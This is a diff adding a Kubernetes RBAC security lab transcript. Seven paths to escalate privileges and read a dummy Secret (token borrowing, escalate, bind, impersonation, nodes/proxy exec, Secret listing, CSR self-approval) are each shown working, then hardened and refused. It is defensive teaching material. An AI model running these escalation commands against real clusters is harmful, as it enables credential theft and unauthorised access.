@@ -1,0 +1,333 @@
+# Transcript for 05-security/01-authn-authz-rbac.md, lab steps 1 to 11.
+# Tier A: a kind cluster on a Linux lab host. Node: Kubernetes v1.37.0, Debian
+# GNU/Linux 13 (trixie), kernel 7.0.0-38-generic, containerd v2.3.4. kubectl
+# v1.37.2. Not run on macOS.
+# The borrowing Pods run curlimages/curl pinned by digest; step 3 prints the
+# curl that ran (curl 8.22.0).
+# Recorded by running full-guide/examples/security-lab/labs/05-01.sh.
+# The script exited 0. Secret values are dummies; no token is printed.
+#
+# What did not work the first time, kept here as found. The borrowed-token call
+# first used busybox wget, and its TLS handshake with the API server failed
+# (alert 47). The Pods use curl now. A later attempt got HTTP 200 from the API
+# server but parsed nothing, because the API server pretty-prints its JSON; the
+# parser allows a space after the colon. This transcript is the run after both
+# fixes.
+#
+# Before this run, probes on the same cluster settled details the chapter states:
+# a list with a metadata.name field selector is name-scoped; a POST to
+# nodes/proxy needs create; kubectl apply needs patch on the Role it edits;
+# granting a rule needs escalate; and the CSR signer refuses approval without
+# the signers grant.
+## step 1: a namespace, a victim that holds a Secret in its environment, and seven identities with broad grants
+$ kubectl create ns p05-rbac
+kubectl label ns p05-rbac pod-security.kubernetes.io/enforce=baseline
+namespace/p05-rbac created
+namespace/p05-rbac labeled
+
+$ kubectl -n p05-rbac create secret generic p05-db-creds --from-literal=password=p05-lab-only-password
+kubectl -n p05-rbac create secret generic p05-app-creds --from-literal=token=p05-lab-only-token
+secret/p05-db-creds created
+secret/p05-app-creds created
+
+$ kubectl apply -f setup.yaml
+serviceaccount/p05-web created
+serviceaccount/p05-deployer created
+serviceaccount/p05-dev created
+serviceaccount/p05-author created
+serviceaccount/p05-binder created
+serviceaccount/p05-impersonator created
+serviceaccount/p05-lister created
+serviceaccount/p05-node created
+serviceaccount/p05-approver created
+role.rbac.authorization.k8s.io/p05-dev created
+rolebinding.rbac.authorization.k8s.io/p05-dev created
+role.rbac.authorization.k8s.io/p05-db-reader created
+rolebinding.rbac.authorization.k8s.io/p05-deployer-db created
+rolebinding.rbac.authorization.k8s.io/p05-readers-db created
+role.rbac.authorization.k8s.io/p05-author created
+rolebinding.rbac.authorization.k8s.io/p05-author created
+role.rbac.authorization.k8s.io/p05-binder created
+rolebinding.rbac.authorization.k8s.io/p05-binder created
+role.rbac.authorization.k8s.io/p05-impersonator created
+rolebinding.rbac.authorization.k8s.io/p05-impersonator created
+role.rbac.authorization.k8s.io/p05-lister created
+rolebinding.rbac.authorization.k8s.io/p05-lister created
+clusterrole.rbac.authorization.k8s.io/p05-node-proxy created
+clusterrolebinding.rbac.authorization.k8s.io/p05-node-proxy created
+clusterrole.rbac.authorization.k8s.io/p05-csr-approver created
+clusterrolebinding.rbac.authorization.k8s.io/p05-csr-approver created
+
+$ kubectl apply -f victim.yaml
+kubectl wait -n p05-rbac --for=condition=Ready pod/p05-victim --timeout=120s
+pod/p05-victim created
+error: timed out waiting for the condition on pods/p05-victim
+
+$ kubectl --kubeconfig dev.kubeconfig auth whoami | grep Username
+Username                                            system:serviceaccount:p05-rbac:p05-dev
+
+## path A, step 2: the dev identity may create Pods, and may read Secrets only if it is granted them
+$ kubectl --kubeconfig dev.kubeconfig auth can-i create pods -n p05-rbac
+kubectl --kubeconfig dev.kubeconfig auth can-i get secrets -n p05-rbac
+kubectl --kubeconfig dev.kubeconfig get secret p05-db-creds -n p05-rbac
+yes
+no
+Error from server (Forbidden): secrets "p05-db-creds" is forbidden: User "system:serviceaccount:p05-rbac:p05-dev" cannot get resource "secrets" in API group "" in the namespace "p05-rbac"
+
+## path A, step 3: a Pod names the p05-deployer ServiceAccount and reads the Secret with the token the kubelet mounts
+$ kubectl --kubeconfig dev.kubeconfig apply -f borrow-pod.yaml
+kubectl --kubeconfig dev.kubeconfig wait -n p05-rbac --for=condition=Ready pod/p05-borrow --timeout=120s
+kubectl --kubeconfig dev.kubeconfig logs -n p05-rbac p05-borrow
+pod/p05-borrow created
+pod/p05-borrow condition met
+curl 8.22.0 (x86_64-pc-linux-musl) libcurl/8.22.0 OpenSSL/3.5.8 zlib/1.3.2 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 libssh2/1.11.1 nghttp2/1.69.0 mit-krb5/1.22.2
+p05-lab-only-password
+
+## path A, step 4: the same escape without a Pod: a Deployment, whose controller creates the Pod
+$ kubectl --kubeconfig dev.kubeconfig create -f borrow-deploy.yaml
+kubectl wait -n p05-rbac --for=condition=Available deployment/p05-borrow-deploy --timeout=120s
+kubectl --kubeconfig dev.kubeconfig logs -n p05-rbac deployment/p05-borrow-deploy
+deployment.apps/p05-borrow-deploy created
+deployment.apps/p05-borrow-deploy condition met
+curl 8.22.0 (x86_64-pc-linux-musl) libcurl/8.22.0 OpenSSL/3.5.8 zlib/1.3.2 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 libssh2/1.11.1 nghttp2/1.69.0 mit-krb5/1.22.2
+p05-lab-only-password
+
+## path A, harden: the dev identity reads Pods and Deployments, and creates neither
+$ kubectl -n p05-rbac delete pod p05-borrow --ignore-not-found
+kubectl -n p05-rbac delete deployment p05-borrow-deploy --ignore-not-found
+pod "p05-borrow" deleted from p05-rbac namespace
+deployment.apps "p05-borrow-deploy" deleted from p05-rbac namespace
+
+$ kubectl apply -f dev-hardened.yaml
+role.rbac.authorization.k8s.io/p05-dev configured
+
+## path A, re-attack: both the direct Pod and the Deployment are refused
+$ kubectl --kubeconfig dev.kubeconfig create -f borrow-pod.yaml
+kubectl --kubeconfig dev.kubeconfig create -f borrow-deploy.yaml
+Error from server (Forbidden): error when creating "borrow-pod.yaml": pods is forbidden: User "system:serviceaccount:p05-rbac:p05-dev" cannot create resource "pods" in API group "" in the namespace "p05-rbac"
+Error from server (Forbidden): error when creating "borrow-deploy.yaml": deployments.apps is forbidden: User "system:serviceaccount:p05-rbac:p05-dev" cannot create resource "deployments" in API group "apps" in the namespace "p05-rbac"
+
+## path B, step 5: the author identity may update its own Role, and that is all it can do with Secrets
+$ kubectl --kubeconfig author.kubeconfig auth can-i get secrets -n p05-rbac
+kubectl --kubeconfig author.kubeconfig auth can-i escalate roles/p05-author -n p05-rbac
+kubectl --kubeconfig author.kubeconfig patch role p05-author -n p05-rbac --type=json -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":[""],"resources":["secrets"],"resourceNames":["p05-db-creds"],"verbs":["get"]}}]'
+kubectl --kubeconfig author.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
+no
+yes
+role.rbac.authorization.k8s.io/p05-author patched
+p05-lab-only-password
+
+## path B, harden 1: remove escalate, keep update and patch; the same patch is refused
+$ kubectl apply -f author-step1.yaml
+role.rbac.authorization.k8s.io/p05-author configured
+
+$ kubectl --kubeconfig author.kubeconfig patch role p05-author -n p05-rbac --type=json -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":[""],"resources":["secrets"],"resourceNames":["p05-db-creds"],"verbs":["get"]}}]'
+Error from server (Forbidden): roles.rbac.authorization.k8s.io "p05-author" is forbidden: user "system:serviceaccount:p05-rbac:p05-author" (groups=["system:serviceaccounts" "system:serviceaccounts:p05-rbac" "system:authenticated"]) is attempting to grant RBAC permissions not currently held:
+{APIGroups:[""], Resources:["secrets"], ResourceNames:["p05-db-creds"], Verbs:["get"]}
+
+## path B, harden 2: remove update and patch as well; a Role the identity cannot edit cannot be widened
+$ kubectl apply -f author-step2.yaml
+role.rbac.authorization.k8s.io/p05-author configured
+
+$ kubectl --kubeconfig author.kubeconfig patch role p05-author -n p05-rbac --type=json -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":[""],"resources":["secrets"],"resourceNames":["p05-db-creds"],"verbs":["get"]}}]'
+kubectl --kubeconfig author.kubeconfig get secret p05-db-creds -n p05-rbac
+Error from server (Forbidden): roles.rbac.authorization.k8s.io "p05-author" is forbidden: User "system:serviceaccount:p05-rbac:p05-author" cannot patch resource "roles" in API group "rbac.authorization.k8s.io" in the namespace "p05-rbac"
+Error from server (Forbidden): secrets "p05-db-creds" is forbidden: User "system:serviceaccount:p05-rbac:p05-author" cannot get resource "secrets" in API group "" in the namespace "p05-rbac"
+
+## path C, step 6: the binder identity creates a RoleBinding to the built-in edit ClusterRole, which it does not hold
+$ kubectl --kubeconfig binder.kubeconfig auth can-i get secrets -n p05-rbac
+kubectl --kubeconfig binder.kubeconfig create rolebinding p05-grab -n p05-rbac --clusterrole=edit --serviceaccount=p05-rbac:p05-binder
+kubectl --kubeconfig binder.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
+no
+rolebinding.rbac.authorization.k8s.io/p05-grab created
+p05-lab-only-password
+
+## path C, harden: remove the binding the attack left, and remove bind; a new binding to edit is refused
+$ kubectl -n p05-rbac delete rolebinding p05-grab --ignore-not-found
+rolebinding.rbac.authorization.k8s.io "p05-grab" deleted from p05-rbac namespace
+
+$ kubectl apply -f binder-hardened.yaml
+role.rbac.authorization.k8s.io/p05-binder configured
+
+$ kubectl --kubeconfig binder.kubeconfig create rolebinding p05-grab -n p05-rbac --clusterrole=edit --serviceaccount=p05-rbac:p05-binder
+error: failed to create rolebinding: rolebindings.rbac.authorization.k8s.io "p05-grab" is forbidden: user "system:serviceaccount:p05-rbac:p05-binder" (groups=["system:serviceaccounts" "system:serviceaccounts:p05-rbac" "system:authenticated"]) is attempting to grant RBAC permissions not currently held:
+{APIGroups:[""], Resources:["bindings"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["configmaps"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["endpoints"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["events"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["limitranges"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["namespaces"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["namespaces/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["persistentvolumeclaims"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["persistentvolumeclaims/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["pods"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["pods/attach"], Verbs:["get" "list" "watch" "create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:[""], Resources:["pods/eviction"], Verbs:["create"]}
+{APIGroups:[""], Resources:["pods/exec"], Verbs:["get" "list" "watch" "create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:[""], Resources:["pods/log"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["pods/portforward"], Verbs:["get" "list" "watch" "create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:[""], Resources:["pods/proxy"], Verbs:["get" "list" "watch" "create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:[""], Resources:["pods/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["replicationcontrollers"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["replicationcontrollers/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["replicationcontrollers/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["resourcequotas"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["resourcequotas/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:[""], Resources:["secrets"], Verbs:["get" "list" "watch" "create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:[""], Resources:["serviceaccounts"], Verbs:["impersonate" "create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["serviceaccounts/token"], Verbs:["create"]}
+{APIGroups:[""], Resources:["services"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:[""], Resources:["services/proxy"], Verbs:["get" "list" "watch" "create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:[""], Resources:["services/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["controllerrevisions"], Verbs:["get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["daemonsets"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["daemonsets/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["deployments"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["deployments/rollback"], Verbs:["create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:["apps"], Resources:["deployments/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["deployments/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["replicasets"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["replicasets/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["replicasets/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["statefulsets"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["statefulsets/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["apps"], Resources:["statefulsets/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["autoscaling"], Resources:["horizontalpodautoscalers"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["autoscaling"], Resources:["horizontalpodautoscalers/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["batch"], Resources:["cronjobs"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["batch"], Resources:["cronjobs/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["batch"], Resources:["jobs"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["batch"], Resources:["jobs/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["coordination.k8s.io"], Resources:["leases"], Verbs:["create" "delete" "deletecollection" "get" "list" "patch" "update" "watch"]}
+{APIGroups:["discovery.k8s.io"], Resources:["endpointslices"], Verbs:["get" "list" "watch"]}
+{APIGroups:["events.k8s.io"], Resources:["events"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["daemonsets"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["daemonsets/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["deployments"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["deployments/rollback"], Verbs:["create" "delete" "deletecollection" "patch" "update"]}
+{APIGroups:["extensions"], Resources:["deployments/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["deployments/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["ingresses"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["ingresses/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["networkpolicies"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["replicasets"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["replicasets/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["replicasets/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["extensions"], Resources:["replicationcontrollers/scale"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["networking.k8s.io"], Resources:["ingresses"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["networking.k8s.io"], Resources:["ingresses/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["networking.k8s.io"], Resources:["networkpolicies"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["policy"], Resources:["poddisruptionbudgets"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["policy"], Resources:["poddisruptionbudgets/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["resource.k8s.io"], Resources:["resourceclaims"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+{APIGroups:["resource.k8s.io"], Resources:["resourceclaims/status"], Verbs:["get" "list" "watch"]}
+{APIGroups:["resource.k8s.io"], Resources:["resourceclaimtemplates"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
+
+## path D, step 7: the impersonator identity reads the Secret as the p05-deployer ServiceAccount
+$ kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac
+kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac --as=system:serviceaccount:p05-rbac:p05-deployer -o jsonpath='{.data.password}' | base64 -d; echo
+Error from server (Forbidden): secrets "p05-db-creds" is forbidden: User "system:serviceaccount:p05-rbac:p05-impersonator" cannot get resource "secrets" in API group "" in the namespace "p05-rbac"
+p05-lab-only-password
+
+$ kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac --as=system:serviceaccount:p05-rbac:p05-web
+Error from server (Forbidden): serviceaccounts "p05-web" is forbidden: User "system:serviceaccount:p05-rbac:p05-impersonator" cannot impersonate resource "serviceaccounts" in API group "" in the namespace "p05-rbac"
+
+## path D, harden: remove the grant; the same impersonation is refused
+$ kubectl -n p05-rbac delete rolebinding p05-impersonator
+sleep 2
+kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac --as=system:serviceaccount:p05-rbac:p05-deployer
+rolebinding.rbac.authorization.k8s.io "p05-impersonator" deleted from p05-rbac namespace
+Error from server (Forbidden): serviceaccounts "p05-deployer" is forbidden: User "system:serviceaccount:p05-rbac:p05-impersonator" cannot impersonate resource "serviceaccounts" in API group "" in the namespace "p05-rbac"
+
+## path E, step 8: the node identity reads kubelet state and runs a command in the victim Pod, with no pods/exec and no secrets
+$ kubectl --kubeconfig node.kubeconfig auth can-i get nodes --subresource=proxy
+kubectl --kubeconfig node.kubeconfig auth can-i create pods --subresource=exec -n p05-rbac
+kubectl --kubeconfig node.kubeconfig get --raw "/api/v1/nodes/$NODE/proxy/pods" | grep -o '"namespace":"[^"]*"' | wc -l
+Warning: resource 'nodes' is not namespace scoped
+
+yes
+no
+      36
+
+$ curl -s --cacert ca.crt -H "Authorization: Bearer $TOK_NODE" -X POST "$SERVER/api/v1/nodes/$NODE/proxy/run/p05-rbac/p05-victim/app?cmd=env" | grep DB_PASSWORD
+DB_PASSWORD=p05-lab-only-password
+
+## path E, harden: nodes get and list for a dashboard, and no proxy; both kubelet calls are refused
+$ kubectl apply -f node-hardened.yaml
+clusterrole.rbac.authorization.k8s.io/p05-node-proxy configured
+
+$ kubectl --kubeconfig node.kubeconfig get --raw "/api/v1/nodes/$NODE/proxy/pods"
+curl -s --cacert ca.crt -H "Authorization: Bearer $TOK_NODE" -X POST "$SERVER/api/v1/nodes/$NODE/proxy/run/p05-rbac/p05-victim/app?cmd=env" | grep -E 'DB_PASSWORD|forbidden'
+Error from server (Forbidden): nodes "sf-pilot-control-plane" is forbidden: User "system:serviceaccount:p05-rbac:p05-node" cannot get resource "nodes/proxy" in API group "" at the cluster scope
+  "message": "nodes \"sf-pilot-control-plane\" is forbidden: User \"system:serviceaccount:p05-rbac:p05-node\" cannot create resource \"nodes/proxy\" in API group \"\" at the cluster scope",
+
+## path F, step 9: the lister identity reads every Secret in the namespace, values included
+$ kubectl --kubeconfig lister.kubeconfig auth can-i get secrets -n p05-rbac
+kubectl --kubeconfig lister.kubeconfig get secrets -n p05-rbac -o go-template='{{range .items}}{{.metadata.name}} {{range $k, $v := .data}}{{$k}}={{$v | base64decode}} {{end}}{{"\n"}}{{end}}'
+no
+p05-app-creds token=p05-lab-only-token 
+p05-db-creds password=p05-lab-only-password 
+
+## path F, harden: name the one Secret the reader needs, with get; list is removed
+$ kubectl apply -f lister-hardened.yaml
+role.rbac.authorization.k8s.io/p05-lister configured
+
+$ kubectl --kubeconfig lister.kubeconfig get secrets -n p05-rbac
+kubectl --kubeconfig lister.kubeconfig get secret p05-db-creds -n p05-rbac
+kubectl --kubeconfig lister.kubeconfig get secret p05-app-creds -n p05-rbac -o jsonpath='{.data.token}' | base64 -d; echo
+Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:p05-rbac:p05-lister" cannot list resource "secrets" in API group "" in the namespace "p05-rbac"
+Error from server (Forbidden): secrets "p05-db-creds" is forbidden: User "system:serviceaccount:p05-rbac:p05-lister" cannot get resource "secrets" in API group "" in the namespace "p05-rbac"
+p05-lab-only-token
+
+## path G, step 10: the approver identity files a CSR for group p05-readers, approves it, and uses the certificate
+$ kubectl --kubeconfig approver.kubeconfig auth can-i create certificatesigningrequests
+openssl genrsa -out impostor.key 2048 2>/dev/null
+openssl req -new -key impostor.key -subj "/CN=p05-impostor/O=p05-readers" -out impostor.csr
+Warning: resource 'certificatesigningrequests' is not namespace scoped in group 'certificates.k8s.io'
+
+yes
+
+$ kubectl --kubeconfig approver.kubeconfig apply -f impostor-csr.yaml
+kubectl --kubeconfig approver.kubeconfig certificate approve p05-impostor-csr
+certificatesigningrequest.certificates.k8s.io/p05-impostor-csr created
+certificatesigningrequest.certificates.k8s.io/p05-impostor-csr approved
+
+$ openssl x509 -in impostor.crt -noout -subject -enddate
+kubectl --kubeconfig impostor.kubeconfig auth whoami | grep -E 'Username|Groups'
+kubectl --kubeconfig impostor.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
+subject=O=p05-readers, CN=p05-impostor
+notAfter=Oct 30 23:07:06 2026 GMT
+Username                                            p05-impostor
+Groups                                              [p05-readers system:authenticated]
+p05-lab-only-password
+
+## path G, harden: remove the signers grant; the approver can still file a CSR, but it cannot approve one
+$ kubectl --kubeconfig approver.kubeconfig auth can-i create certificatesigningrequests
+Warning: resource 'certificatesigningrequests' is not namespace scoped in group 'certificates.k8s.io'
+
+yes
+
+$ kubectl apply -f approver-hardened.yaml
+clusterrole.rbac.authorization.k8s.io/p05-csr-approver configured
+
+$ kubectl --kubeconfig approver.kubeconfig apply -f impostor2-csr.yaml
+kubectl --kubeconfig approver.kubeconfig certificate approve p05-impostor2-csr
+certificatesigningrequest.certificates.k8s.io/p05-impostor2-csr created
+Error from server (Forbidden): certificatesigningrequests.certificates.k8s.io "p05-impostor2-csr" is forbidden: user not permitted to approve requests with signerName "kubernetes.io/kube-apiserver-client"
+
+## step 11: tear down what the lab created
+$ kubectl delete ns p05-rbac --wait=true
+kubectl delete clusterrolebinding p05-node-proxy p05-csr-approver --ignore-not-found
+kubectl delete clusterrole p05-node-proxy p05-csr-approver --ignore-not-found
+kubectl delete csr p05-impostor-csr p05-impostor2-csr --ignore-not-found
+kubectl get clusterrole,clusterrolebinding,csr p05-node-proxy p05-csr-approver p05-impostor-csr p05-impostor2-csr --ignore-not-found
+echo 'no lab-owned cluster objects left'
+namespace "p05-rbac" deleted
+clusterrolebinding.rbac.authorization.k8s.io "p05-node-proxy" deleted
+clusterrolebinding.rbac.authorization.k8s.io "p05-csr-approver" deleted
+clusterrole.rbac.authorization.k8s.io "p05-node-proxy" deleted
+clusterrole.rbac.authorization.k8s.io "p05-csr-approver" deleted
+certificatesigningrequest.certificates.k8s.io "p05-impostor-csr" deleted
+certificatesigningrequest.certificates.k8s.io "p05-impostor2-csr" deleted
+no lab-owned cluster objects left
+
